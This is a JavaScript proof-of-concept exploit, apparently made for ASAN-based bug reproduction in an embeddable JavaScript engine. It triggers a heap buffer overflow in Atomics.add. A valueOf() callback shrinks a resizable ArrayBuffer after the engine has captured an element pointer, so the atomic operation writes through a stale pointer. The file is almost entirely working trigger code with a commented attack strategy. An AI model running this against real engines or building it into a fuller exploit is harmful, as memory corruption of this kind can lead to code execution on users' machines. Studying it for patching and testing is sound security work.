// Exploit for heap buffer overflow in Atomics operations via Resizable ArrayBuffer
//
// Vulnerability: js_atomics_op() captures a pointer to the buffer element before
// calling JS_ToUint32() on the value argument. JS_ToUint32 can execute user code
// via valueOf(), which can resize the underlying ArrayBuffer. The stale pointer
// is then used for the atomic operation, causing a heap buffer overflow.
//
// Attack strategy:
// 1. Create a resizable ArrayBuffer with initial size (e.g., 1024 bytes)
// 2. Create an Int32Array view over it
// 3. Create a malicious object with valueOf() that shrinks the buffer
// 4. Call Atomics.add(typedArray, index, maliciousObject) where index is valid
//    for the original size but out-of-bounds for the shrunk buffer
// 5. The atomic operation uses stale pointer, causing heap-buffer-overflow

// Create a resizable ArrayBuffer with initial 1024 bytes, max 2048 bytes
let ab = new ArrayBuffer(1024, { maxByteLength: 2048 });

// Create an Int32Array view - each element is 4 bytes
// So we have 1024/4 = 256 elements (indices 0-255)
let int32Array = new Int32Array(ab);

// Target index: access index 200 (byte offset 800)
// This is valid for the original 1024-byte buffer
// After resize to 8 bytes, this will be way out of bounds
const targetIndex = 200;

// Initialize the element at target index
int32Array[targetIndex] = 42;

// Create malicious object with valueOf that shrinks the buffer
let malicious = {
    valueOf: function() {
        // Shrink the buffer from 1024 bytes to just 8 bytes
        // This makes index 200 (byte offset 800) out of bounds
        ab.resize(8);
        return 1;  // Return a value for the atomic operation
    }
};

// Trigger the vulnerability!
// 1. js_atomics_get_ptr captures ptr pointing to int32Array[200] (byte 800 in original buffer)
// 2. JS_ToUint32 is called on malicious object, triggering valueOf()
// 3. valueOf() resizes ab from 1024 to 8 bytes
// 4. Only detached check happens (not resize check)
// 5. Atomic operation uses stale ptr -> HEAP BUFFER OVERFLOW
try {
    Atomics.add(int32Array, targetIndex, malicious);
} catch (e) {
    // We may get an exception, but the ASAN error should still trigger
    print("Exception: " + e);
}

print("Done");
